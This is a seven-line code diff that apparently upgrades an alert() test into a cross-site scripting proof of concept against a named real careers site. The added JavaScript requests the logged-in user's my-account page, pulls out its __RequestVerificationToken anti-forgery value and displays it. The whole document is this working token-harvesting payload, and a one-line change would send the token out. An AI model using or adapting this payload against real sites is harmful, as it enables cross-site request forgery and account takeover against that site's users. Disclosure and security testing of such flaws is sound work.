@@ -1,1 +1,7 @@
-alert()
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','https://careers.next.co.uk/my-account/',true);
+req.send();
+function handleResponse() {
+var token = document.getElementsByName('__RequestVerificationToken')[0].value;
+alert(token)};
